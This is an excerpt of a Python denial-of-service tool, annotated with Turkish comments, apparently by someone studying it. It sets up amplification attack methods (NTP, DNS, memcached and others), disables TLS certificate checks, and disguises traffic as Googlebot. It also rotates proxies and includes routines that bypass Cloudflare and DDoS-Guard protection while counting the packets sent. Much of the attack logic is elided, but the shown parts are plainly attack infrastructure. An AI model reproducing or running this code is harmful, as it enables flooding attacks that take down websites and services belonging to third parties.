...
from concurrent.futures import ThreadPoolExecutor, as_completed ## threadpool çoklu iş parçacığı için kullanılır
from contextlib import suppress
from itertools import cycle ##döngü için kullanılır
from json import load  ### json dosyalarını okumak i.in kullanılır
from logging import basicConfig, getLogger, shutdown ## log mesajları için 
...
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                    ...
                    gethostname, socket) ## ağ bağlantıları için gerekli socket kütüphanesi
from ssl import CERT_NONE, SSLContext, create_default_context
from struct import pack as data_pack ##binary veri çekme ve paketleme için sttttruucccttt
...
from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles ##ara sunucu için 
from PyRoxy import Tools as ProxyTools
from certifi import where
from cloudscraper import create_scraper ##cloudfare korumasını aşmak için 
from dns import resolver
from icmplib import ping ## ping işlemleri
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP ## ağ paketlerini oluşturmak için
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory ##sistem kaynaklarını izlemek için
from requests import Response, Session, exceptions, get, cookies
from yarl import URL
from base64 import b64encode
##psutil sistem sys ise python bilgilerini çekerr
basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("JACOB") ## jacob adıyla loglar tutar
logger.setLevel("INFO") ## loglar info olaarak tutulur


ctx: SSLContext = create_default_context(cafile=where()) ##https bağlantıları için güvenli ssl bağlamı oluşturu
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE ## sertifika doğrulamasını tamamne kapatır
 ## amaç burda https siteye istek atarken sertifika doğrulamasını atlatmak
__version__: str = "2.4 SNAPSHOT" ## programın süürmü
__dir__: Path = Path(__file__).parent
__ip__: Any = None ## sistemin ip sini alır
tor2webs = [ ##onion uzantılı web sitelerine normal tarayııcıdan girmek için
            'onion.city',
            'onion.cab',
            'onion.direct',
            'onion.sh',
...
with open(__dir__ / "config.json") as f:
    con = load(f) ## config.jsondaki değişkenler con da saklanır 

with socket(AF_INET, SOCK_DGRAM) as s: ##ipv4 ve udp socketi açar
    s.connect(("8.8.8.8", 80)) ##google dns e bağlanır
    __ip__ = s.getsockname()[0] ##sistemin ipsini saklar


class bcolors: ##renkli terminal sınıfları 
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
...
def exit(*message): ## programı güvenli kapatabilmek için
    if message: ## eğer hata mesaj ogelirse 
        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET) ##log a kırmzı mesaj atar
    shutdown() ###loggeri kapat 
    _exit(1)
...
class Methods:
    ...
    LAYER4_AMP: Set[str] = { ## mem de gitlaba 2018 de büyük saldırı oldu 1.8 tbs 
        "MEM", "NTP", "DNS", "ARD",
        "CLDAP", "CHAR", "RDP"
    }
...
google_agents = [ ## vurda amaç bot trafiğini normal botlar google olarak göstermek için bazı sitelerde google botu engellenmiyor
...
REQUESTS_SENT = Counter() ##gönderilen toplam istek sayısı
BYTES_SEND = Counter() ##gönderilen toplam veri


class Tools: ##farklı yerlerde küçük görevler yapan sınıf 
    IP = compile("(?:\\d{1,3}\\.){3}\\d{1,3}") ##ip adeslrini yakalamak için
    protocolRex = compile('"protocol":(\\d+)')

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2): ##byte formatını okunabilir formata çeler
        MULTIPLES = [
    ...
    @staticmethod
    def humanformat(num: int, precision: int = 2): ## büyük sayıları kısaltır
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
    ...
    @staticmethod
    def sizeOfRequest(res: Response) -> int: ##https isteiğini boyutunu hesaplar
    ...
    @staticmethod
    def send(sock: socket, packet: bytes): ##tcp ile veri gönderir
        global BYTES_SEND, REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1 ##veriye ekler gönderdiği şeyi 
        return True

    @staticmethod
    def sendto(sock, packet, target): ##udp ile veri gönderir
        global BYTES_SEND, REQUESTS_SENT
    ...
    @staticmethod
    def dgb_solver(url, ua, pro=None): ##ddos guard olan sitelerde oturum açma ve cokkie elde etme
        s = None 
        """Görev: DDoS-Guard koruması olan sitelerde cookie çözme ve oturum açma.

Nasıl çalışır:

    Bir Session (requests.Session) açar.

    İlk istek → cookie toplar.

    check.ddos-guard.net’e ek istek atarak gerekli güvenlik cookie’sini alır (__ddg2).

    Siteye tekrar giderek korumayı aşılmış şekilde session döndürür.

Amaç: Bot trafiğini normal tarayıcı gibi göstermek."""
        idss = None
        with Session() as s:
            if pro:
                s.proxies = pro
    ...
    def safe_close(sock=None):
        if sock:
            sock.close() 
"""IP, protocolRex → Regex tanımları.

humanbytes, humanformat → Sayıları okunabilir formata çevirme.

sizeOfRequest → HTTP isteğinin boyutunu hesaplama.

send, sendto → TCP/UDP veri gönderme + sayaç artırma.

dgb_solver → DDoS-Guard korumasını atlatma.

safe_close → Soket kapatma."""
